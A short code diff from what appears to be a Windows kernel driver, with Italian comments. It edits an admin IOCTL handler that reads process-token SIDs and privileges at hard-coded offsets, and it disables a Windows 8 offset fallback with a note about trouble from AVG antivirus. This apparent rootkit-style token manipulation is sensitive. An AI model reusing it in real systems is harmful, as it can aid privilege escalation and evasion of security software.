@@ -317,13 +317,16 @@ NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATI
 		sid_count = *((DWORD *)(token + 0x78));
 		sid_array = *((SIE **)(token + 0x90));
 		privilege = (DWORD *)(token + 0x40);
-		if (!CheckSIEPointer(sid_array)) {
+
+		// XXX Da rivalutare per l'uso in Windows 8
+		// Testare con AV (AVG) che dava problemi....
+/*		if (!CheckSIEPointer(sid_array)) {
 			// Offser per Windows8
 			sid_count = *((DWORD *)(token + 0xE8));
 			sid_array = *((SIE **)(token + 0xF0));
 			if (!CheckSIEPointer(sid_array))
 				return STATUS_SUCCESS;
-		}
+		}*/
 
 		// Cicla la lista dei SID associati al token effettivo
 		for (i=0; i<sid_count; i++) {
